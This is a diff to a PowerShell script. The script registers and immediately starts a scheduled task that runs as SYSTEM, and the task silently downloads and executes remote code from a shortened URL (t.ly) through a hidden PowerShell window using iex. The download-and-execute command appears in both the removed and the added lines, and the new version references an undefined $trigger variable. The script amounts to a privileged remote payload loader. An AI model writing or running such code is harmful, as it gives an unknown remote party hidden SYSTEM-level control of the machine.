@@ -13,19 +13,23 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Define the action to be taken (PowerShell command)
-$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
-    -Argument '-WindowStyle Hidden -NoProfile -Command "iex((New-Object System.Net.WebClient).DownloadString(\'https://t.ly/TBedb\'))"'
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument {
+    -WindowStyle Hidden 
+    -NoProfile 
+    -Command "iex((New-Object System.Net.WebClient).DownloadString('https://t.ly/TBedb'))"
+}
 
 # Define the principal (run as SYSTEM)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
 
-# Create and register the task
-$taskName = "ImmediateTaskAsSystem"
-Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Settings (New-ScheduledTaskSettingsSet -RunWhetherUserIsLoggedOnOrNot $true -DisallowStartIfOnBatteries $false -StopIfGoingOnBatteries $false -StartWhenAvailable $true)
+# Create settings for the task - removing explicit Boolean values
+$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries
+
+# Register the task
+$taskName = "RunWhetherLoggedInOrNot"
+Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 
 # Start the task immediately
 Start-ScheduledTask -TaskName $taskName
 
-# Optionally, wait a moment for the task to execute, then remove it
-Start-Sleep -Seconds 3
-exit
+Read-Host -Prompt "Press Enter to exit"
